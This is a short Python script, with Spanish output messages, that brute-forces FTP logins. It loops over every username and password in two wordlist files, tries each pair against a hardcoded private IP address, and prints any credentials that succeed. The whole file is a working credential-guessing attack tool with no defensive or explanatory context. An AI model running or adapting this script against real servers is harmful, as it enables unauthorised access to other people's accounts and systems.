import sys
import ftplib

def bruteforce_ftp(target,usuario,contrasena):
	ftp = ftplib.FTP(target)
	try:
		ftp.login(usuario,contrasena)
		ftp.quit()
		print('(+) Se encontraron las credenciales')
		print('{}:{}'.format(usuario,contrasena))
	except:
		print("Fallo la Autenticacion {}:{}".format(usuario,contrasena))

def main():
	target = "192.168.1.71" # IPv4
	users = open("user.txt",'r')
	users = users.read().split("\n")
	passwords = open("pass.txt",'r')
	passwords = passwords.read().split("\n")

	for user in users:
		for password in passwords:
			bruteforce_ftp(target,user,password)

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		sys.exit()
